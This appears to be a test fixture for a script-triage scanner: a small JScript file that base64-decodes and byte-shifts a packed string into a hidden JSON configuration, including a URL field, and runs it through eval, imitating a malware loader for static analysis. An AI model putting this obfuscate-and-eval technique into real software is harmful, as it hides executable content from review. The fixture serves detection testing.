// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decodeBase64(text) {
  var alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  var clean = text.replace(/[^A-Za-z0-9+\/=]/g, "");
  var output = [];
  for (var p = 0; p < clean.length; p += 4) {
    var a = alphabet.indexOf(clean.charAt(p));
    var b = alphabet.indexOf(clean.charAt(p + 1));
    var c = clean.charAt(p + 2) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 2));
    var d = clean.charAt(p + 3) == "=" ? -1 : alphabet.indexOf(clean.charAt(p + 3));
    output.push((a << 2) | (b >> 4));
    if (c >= 0) output.push(((b & 15) << 4) | (c >> 2));
    if (d >= 0) output.push(((c & 3) << 6) | d);
  }
  return output;
}
var decode_2a73deb4 = function(s) {
  var d = [];
  for (var i = 0; i < s.length; i++) { d.push((s[i] - 13 + 256) % 256); }
  return d;
};
var recover_c3792248 = function() {
  if (true) {
    var packedText = "iC+AgXJ9gC9HaC9ucH6Cdn9ybH9yenyBci85L3F2gH1ugXB1bHpyenx/hi9qOS9ucW59gXJ/L0cvWm" + "BlWlk/O2VaWVVhYV07Qzs9Lzkvg255gnKAL0eIL3Buen1udnR7bHZxL0cvcG56fW52dHs6RURBREFw" + "QnNxcS85L4J/eS9HL3WBgX2ARzw8RURBREFwQnNxcTtyhW56fXlyO3Z7g255dnE8P0ZGPUBEc0I7cW" + "6BLzkvgoByf2xudHJ7gS9HL1WCe4F/coCAWW5vPEVEQURBcEJzcXEvijkvgIFudHJQfIJ7gS9HP4o=";
    var s = decodeBase64(packedText);
    var n = (2 > 1) ? "left" : "right";
    var d = [];
    var pass = 0;
    while (pass < 1) { d = decode_2a73deb4.apply(null, [s]); pass++; }
    var t = d.length ? String.fromCharCode(d[0]) : "", bi = 1;
    for (bi = 1; bi < d.length; bi++) { t = t.concat(String.fromCharCode(d[bi])); }
    return t;
  }
};
var inspect_274d3ae1 = function() {
  var o = eval("(" + recover_c3792248.apply(null, []) + ")");
  return { steps: o["steps"], adapter: o["adapter"], values: o["values"], stageCount: o["stageCount"] };
};
